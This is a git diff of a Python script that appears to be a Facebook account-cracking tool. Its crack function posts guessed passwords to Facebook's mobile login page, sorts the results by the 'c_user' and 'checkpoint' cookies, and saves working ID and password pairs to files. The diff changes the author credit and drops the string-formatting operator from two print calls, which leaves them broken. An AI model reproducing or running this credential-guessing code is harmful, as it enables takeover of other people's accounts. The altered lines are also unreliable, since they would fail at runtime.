@@ -76,7 +76,7 @@ def banner():
 	tap = me()
 	tap.add_column('Author', style='yellow', justify='center')
 	tap.add_column('Github', style='yellow', justify='center')
-	tap.add_row('Sptty Chan','https://github.com/shinzy12')
+	tap.add_row('SHINxTEAM','https://github.com/shinzy12')
 	sol().print(tap, justify='center')
 
 # VALIDASI TOKEN
@@ -432,12 +432,12 @@ def crack(idf,pwv):
 			z = ses.get('https://m.facebook.com')
 			j = ses.post('https://m.facebook.com/login.php', data=dt, headers=head, allow_redirects=True)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print('\r%s[CP] %s|%s        '%(b,idf,pw))
+				print('\r%s[CP] %s|%s        '(b,idf,pw))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s[OK] %s|%s        '%(h,idf,pw))
+				print('\r%s[OK] %s|%s        '(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
 				break
